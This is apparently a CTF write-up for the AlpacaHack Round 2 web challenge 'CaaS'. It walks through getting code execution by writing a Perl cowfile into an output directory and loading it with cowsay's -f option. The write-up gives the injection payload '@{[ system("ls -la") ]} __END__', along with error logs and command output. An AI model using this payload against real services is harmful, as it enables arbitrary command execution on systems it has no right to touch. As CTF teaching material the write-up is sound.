---
title: "AlpacaHack Round 2 (Web) - CaaS (Cow as a Service)"
date: "2024-11-07"
tags:
  - writeups
  - ctf
  - perl
  - command injection
toc: true
math: true
bold: true
nomenu: false
---

## Overview

I've initially thought that this is a JavaScript command injection challenge, since that we have the flag located at the root and we have a binary that is being executed (`/usr/games/cowsay`). I began to read the documentation of [google/zx](https://github.com/google/zx), but after a while I didn't find anything that could lead to command injection.

Then I've started to explore the binary itself `/usr/games/cowsay`, I also setup a verbose output for `ZX` as I've read the documentation.

```js
await $({
    verbose: true,
    cwd: "public/out",
    timeout: "2s",
})`/usr/games/cowsay ${message} > ${uuid}`;
```

I've read the [manpage for the binary](https://linux.die.net/man/1/cowsay), where I've noticed few options:

- cowsay [-e eye_string] [-f cowfile] [-h] [-l] [-n] [-T tongue_string] [-W column] [-bdgpstwy] 

I've exprimeneted a bit with the `-eTW` options but that yielded nothing, then I've tried the `-l` and `-f` options. The `-l` option lists
the cowfiles located in `/usr/share/cowsay/cows/*.cow` those are templates for the `cowsay`. Since that we can write a file to `/app/public/out/*` I thought that we can create a cow file that would list the root directory, so I've went to see what are the specifications of that cowfile.

I've explored few github projects with additional templates for cowsay and how they are structured, here is an example template:

```
##
## acsii picture from http://www.ascii-art.de/ascii/ab/bear.txt
##
$eye = chop($eyes);
$the_cow = <<EOC;
 $thoughts
  $thoughts
     .--.              .--.
    : (\\ ". _......_ ." /) :
     '.    `        `    .'
      /'   _        _   `\\
     /     $eye}      {$eye     \\
    |       /      \\       |
    |     /'        `\\     |
     \\   | .  .==.  . |   /
      '._ \\.' \\__/ './ _.'
      /  ``'._-''-_.'``  \\
EOC
```

And as the man page says `A cowfile is made up of a simple block of perl(1) code`, so we can write a perl to the `/out` directory and try to execute it with `-f` option.

But since that we have bunch of symbols before the text we control like:

```
 _______________
< waht the fuck >
 ---------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

I wasn't sure that if this file is going to run (it didnt). 

```
web-1  | $ /usr/games/cowsay -f/app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 > e50643f3-8ffe-4772-bab7-3896acbeb65b
web-1  | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 5, near ")\"
web-1  |        (Missing operator before \?)
web-1  | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6, near ")\"
web-1  |        (Missing operator before \?)
web-1  | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6, near ")\"
web-1  |        (Missing operator before \?)
web-1  | cowsay: Search pattern not terminated at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6.
```

> Note: I didn't use Burp/Caido, I just went to the input field and placed my payloads.

So I went to see if there are stuff like string formats in Perl, and I found the weirdly named [Baby cart](https://metacpan.org/pod/perlsecret#Baby-cart) for interpolation. And I've tried with it with the following payload.

```
@{[ system("ls -la") ]}
```

And I've done it, I made the perl to error again. Now I was at a dead end and I got little help with it, I discovered the `__END__` bullshit, now this is a special Perl literal that ends the script and that was the thing that I was missing. So in the end the payload became:

```
@{[ system("ls -la") ]} __END__
```

And then I would get the UUID and use it again as

```
-f/app/public/out/UUID
```

To get the output:

```
total 1072
drwxrwxrwt 1 root root 32768 Nov  7 09:24 .
drwxr-xr-x 1 root root  4096 Nov  7 06:56 ..
-rw-r--r-- 1 root root     0 Aug 25 11:38 .gitkeep
-rw-r--r-- 1  404  404    13 Nov  7 07:52 011869a0-aaf5-47e2-b6da-7d9bbb82f567
-rw-r--r-- 1  404  404    13 Nov  7 07:25 014eb95c-17f2-45bd-85df-c7714a14e68e
-rw-r--r-- 1  404  404   175 Nov  7 08:30 028ad084-a645-4ef5-b0de-8e8516b2aab6
-rw-r--r-- 1  404  404    13 Nov  7 07:40 02cdb7a8-8d39-494b-84cc-860ee5dd7f3f
<ANOTHER 30k UUID>
 __
<  >
 --
```

And then we can simply `cat` the flag.

> Note: You don't even need the weirdly  named stuf in "Perl secret operators and constants", because it turns out that this is not even in perl itself, thanks to the users of StackOverflow that are always suggesting 3rd party solutions to simple things!